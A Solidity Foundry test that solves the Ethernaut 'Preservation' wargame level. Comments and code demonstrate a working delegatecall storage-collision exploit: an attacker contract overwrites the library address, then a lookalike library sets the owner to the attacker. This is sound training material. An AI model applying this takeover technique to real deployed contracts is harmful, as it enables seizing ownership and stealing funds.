// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

import "../levels/16-Preservation/PreservationFactory.sol";
import "../core/Ethernaut.sol";

contract PreservationTest is Test {
    Ethernaut ethernaut;
    address attacker = makeAddr("attacker");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testPreservationHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        PreservationFactory preservationFactory = new PreservationFactory();
        ethernaut.registerLevel(preservationFactory);
        vm.startPrank(attacker, attacker); // origin has its importance in this challenge
        address levelAddress = ethernaut.createLevelInstance(preservationFactory);
        Preservation ethernautPreservation = Preservation(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Preservation contract stores the address of the library contracts in its storage
        // and allows to call the setTime function of the library contracts using delegatecall.
        // As the library contracts store the timestamp in their storage in the slot 0,
        // it opens the possibility to overwrite the storage of the Preservation contract
        // by calling the setTime function of the library contracts with the address of an attacker contract.
        //
        // As address is 20 bytes long and uint256 is 32 bytes long we can store an address in a uint256
        // by casting the address to uint160 and then to uint256.
        //
        // When using delegate call, it uses the storage of the caller contract, not the callee contract.
        // Hence by creating a contract with the same storage layout
        // and then calling the victim contract function that will perform a delegatecall
        // to the library contract but with a malicious setTime function, it is possible to overwrite the storage
        // of Preservation contract with the owner address.
        //
        // So first step is to call setFirstTime with the address of the attacker contract casted to uint256.
        // This will overwrite the storage of the Preservation contract with the address of the malicious library contract.
        //
        // Then we call setFirstTime again with the address of the attacker contract casted to uint256.
        // This will overwrite the storage of the Preservation contract allowing owner to be set to the address of the attacker
        // and take over the contract.
        //
        // Storage layout of Preservation contract:
        // | Name             | Type    | Slot | Offset | Bytes |
        // |------------------|---------|------|--------|-------|
        // | timeZone1Library | address | 0    | 0      | 20    |
        // | timeZone2Library | address | 1    | 0      | 20    |
        // | owner            | address | 2    | 0      | 20    |
        // | storedTime       | uint256 | 3    | 0      | 32    |
        //
        // Storage layout of LibraryContract contract:
        // | Name       | Type    | Slot | Offset | Bytes |
        // |------------|---------|------|--------|-------|
        // | storedTime | uint256 | 0    | 0      | 32    |
        //
        // Storage layout of LibraryTakeOver contract:
        // | Name             | Type    | Slot | Offset | Bytes |
        // |------------------|---------|------|--------|-------|
        // | timeZone1Library | address | 0    | 0      | 20    |
        // | timeZone2Library | address | 1    | 0      | 20    |
        // | owner            | address | 2    | 0      | 20    |

        LibraryTakeOver libraryTakeOver = new LibraryTakeOver();
        PreservationAttacker preservationAttacker = new PreservationAttacker();
        preservationAttacker.collidePreservationStorage(ethernautPreservation, address(libraryTakeOver));
        ethernautPreservation.setFirstTime(uint256(uint160(attacker)));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract PreservationAttacker {
    // call the preservation contract function that will perform a delegatecall
    function collidePreservationStorage(Preservation preservation, address libraryTakeOver) external {
        preservation.setFirstTime(uint256(uint160(libraryTakeOver)));
    }
}

contract LibraryTakeOver {
    // Match storage of victim contract
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    // Match function signature for delegatecall
    function setTime(uint256 newOwner) public {
        owner = address(uint160(newOwner));
    }
}
